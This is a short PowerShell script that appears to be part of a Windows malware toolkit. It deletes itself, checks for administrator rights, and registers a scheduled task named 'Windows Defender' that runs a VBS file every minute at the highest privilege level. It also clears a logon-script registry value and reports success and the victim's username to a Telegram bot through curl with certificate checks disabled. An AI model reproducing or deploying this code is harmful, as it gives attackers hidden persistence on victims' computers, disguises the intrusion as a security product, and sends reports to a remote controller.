<##>
$token = $args[0];
$chat_id = $args[1];

$filename = $MyInvocation.MyCommand.Definition.ToString();
Remove-Item -Path $filename -Force;

$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent());
if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $false){
	$message = "%E2%9C%96%EF%B8%8F Need Administrator Privileges";
}
else{
    try{
        SCHTASKS.exe /DELETE /TN "Windows Defender" /F;
        $Action = New-ScheduledTaskAction -Execute C:\Windows\Python\Main.vbs;
        $Time = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1);
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries;
        Register-ScheduledTask -TaskName 'Windows Defender' -Trigger $Time -User ($env:COMPUTERNAME + '\' + $env:USERNAME) -Action $Action -Settings $Settings -RunLevel Highest;
        $message = "%E2%9C%94%EF%B8%8F Scheduled Task created successfully";
        }
    catch{
        $message = "%E2%9C%96%EF%B8%8F Failed To Create A Scheduled Task";
    }
    Remove-ItemProperty "HKCU:\Environment" -Name "UserInitMprLogonScript" -Force;
}

function Send_Message(){
    $url = "https://api.telegram.org/bot" + $token + "/sendMessage?text=" + $message + "%0A--$env:Username--&chat_id=" + $chat_id;
    cmd.exe /c curl $url -s -k;
}
Send_Message;